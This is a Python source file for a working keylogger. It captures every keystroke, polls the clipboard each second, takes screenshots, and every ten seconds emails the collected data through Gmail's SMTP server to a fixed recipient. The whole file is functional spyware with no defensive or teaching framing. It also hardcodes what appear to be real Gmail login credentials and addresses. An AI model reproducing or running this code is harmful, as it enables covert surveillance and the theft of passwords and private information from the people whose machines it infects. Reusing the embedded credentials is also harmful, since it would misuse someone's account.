from pynput import keyboard
import smtplib
import threading
import pyperclip
import pyautogui
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from io import BytesIO
import time

# variables to store keystrokes and clipboard 
text = ""
shift_pressed = False
clipboard_content = ""

# Gmail account credentials
sender_email = "bhunalprashant5@gmail.com"
sender_password = "ytsu rark ylaj capj"  # Consider using an App Password if needed
receiver_email = "prashantbhunal9@gmail.com"

# Time interval in seconds to send an email
time_interval = 10

def send_email():
    global text, clipboard_content  # Declare text and clipboard_content as global to modify them
    try:
        # Set up the MIME
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = receiver_email
        message['Subject'] = 'Keystroke Data'
        
        # Combine keystrokes and clipboard content
        email_body = f"Keystrokes:\n{text}\n\nClipboard Content:\n{clipboard_content}"
        message.attach(MIMEText(email_body, 'plain'))
        
        # Take a screenshot
        screenshot = pyautogui.screenshot()
        screenshot_io = BytesIO()
        screenshot.save(screenshot_io, format='PNG')
        screenshot_io.seek(0)
        
        # Attach the screenshot
        image = MIMEImage(screenshot_io.read(), name='screenshot.png')
        message.attach(image)
        
        # Create an SMTP session
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # Secure the connection
        server.login(sender_email, sender_password)  # Login
        
        # Send the email
        server.send_message(message)
        server.quit()
        
        # Clear the text and clipboard content after sending
        text = ""
        clipboard_content = ""
        
        # Reschedule email by using time interval
        global email_timer
        email_timer = threading.Timer(time_interval, send_email)
        email_timer.start()
    
    except Exception as e:
        print(f"Failed to send email: {e}")

def on_press(key):
    global text, shift_pressed  # Declare text and shift_pressed as global to modify them
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = True
    elif key == keyboard.Key.esc:
        return False
    else:
        # Handle special characters when shift is pressed
        if shift_pressed:
            special_chars = {
                '1': '!',
                '2': '@',
                '3': '#',
                '4': '$',
                '5': '%',
                '6': '^',
                '7': '&',
                '8': '*',
                '9': '(',
                '0': ')',
                '-': '_',
                '=': '+',
                '[': '{',
                ']': '}',
                '\\': '|',
                ';': ':',
                '\'': '"',
                ',': '<',
                '.': '>',
                '/': '?'
            }
            key_str = str(key).strip("'")
            if key_str in special_chars:
                text += special_chars[key_str]
            else:
                text += key_str
            shift_pressed = False
        else:
            text += str(key).strip("'")

def monitor_clipboard():
    global clipboard_content
    try:
        while True:
            clipboard_content = pyperclip.paste()
            time.sleep(1)  # Check clipboard every second
    except Exception as e:
        print(f"Clipboard monitoring failed: {e}")

# Start clipboard monitoring in a separate thread
clipboard_thread = threading.Thread(target=monitor_clipboard)
clipboard_thread.daemon = True
clipboard_thread.start()

# Start email sending function
email_timer = threading.Timer(time_interval, send_email)
email_timer.start()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
